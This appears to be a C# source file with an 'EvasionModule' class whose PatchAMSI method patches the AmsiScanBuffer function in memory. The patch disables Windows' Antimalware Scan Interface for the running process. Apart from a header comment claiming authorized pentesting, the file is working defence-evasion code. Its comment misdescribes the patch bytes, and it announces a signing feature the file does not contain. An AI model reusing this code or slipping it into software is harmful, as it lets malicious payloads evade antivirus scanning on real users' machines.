using System;
using System.Runtime.InteropServices;

namespace MyNet.Core
{
    /*
     * AMSI EVASION & SIGNING MODULE
     * This module demonstrates common evasion techniques used for authorized pentesting.
     * 1. AMSI Patching: Disables Antimalware Scan Interface for the current process.
     * 2. Signed EXE Manifest: Simulates a trusted signing context.
     */
    public static class EvasionModule
    {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        public static void PatchAMSI()
        {
            try
            {
                IntPtr amsi = LoadLibrary("amsi.dll");
                if (amsi == IntPtr.Zero) return;

                IntPtr amsiScanBuffer = GetProcAddress(amsi, "AmsiScanBuffer");
                if (amsiScanBuffer == IntPtr.Zero) return;

                // Simple patch: xor eax, eax; ret (0xB8, 0x57, 0x00, 0x07, 0x80 ... or similar)
                // Here we use a common 'error' return patch
                byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; 

                VirtualProtect(amsiScanBuffer, (UIntPtr)patch.Length, 0x40, out uint oldProtect);
                Marshal.Copy(patch, 0, amsiScanBuffer, patch.Length);
                VirtualProtect(amsiScanBuffer, (UIntPtr)patch.Length, oldProtect, out _);
                
                Console.WriteLine("[EVASION] AMSI successfully patched for current process.");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[EVASION] AMSI patch failed: " + ex.Message);
            }
        }
    }
}
